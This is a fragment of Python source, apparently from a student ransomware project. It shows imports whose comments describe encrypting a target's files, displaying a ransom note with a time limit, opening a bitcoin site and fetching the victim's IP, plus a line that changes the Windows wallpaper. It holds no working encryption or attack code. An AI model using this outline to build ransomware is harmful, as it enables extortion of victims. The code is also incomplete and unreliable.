# Imports
from cryptography.fernet import Fernet # encrypt/decrypt files on target system
#Fernet guarantees that a message encrypted using it cannot be manipulated or read without the key.
#Fernet is an implementation of symmetric (also known as “secret key”) authenticated cryptography. 
import os # to get system root
import webbrowser # to load webbrowser to go to specific website eg bitcoin
import ctypes # so we can intereact with windows dlls and change windows background etc
import urllib.request # used for downloading and saving background image
import cv2
import requests # used to make get reqeust to api.ipify.org to get target machine ip addr
import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
import datetime # to give time limit on ransom note
import subprocess # to create process for notepad and open ransom  note
import win32gui # used to get window text to see if ransom note is on top of all other windows
from Crypto.PublicKey import RSA
import threading # used for ransom note and decryption key on dekstop
from Crypto.Cipher import AES, PKCS1_OAEP


imageUrl = r"C:\Users\Acer\Desktop\3AnnéeEsisa2022\deuxieme semestre\PFA\Python-Ransomware-master\images\img7.jpg"
        # Go to specif url and download+save image using absolute path
        #path = f'background.jpg'
        #urllib.request.urlretrieve(imageUrl, path)
SPI_SETDESKWALLPAPER = 20
        # Access windows dlls for funcionality eg, changing dekstop wallpaper
ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, imageUrl, 0)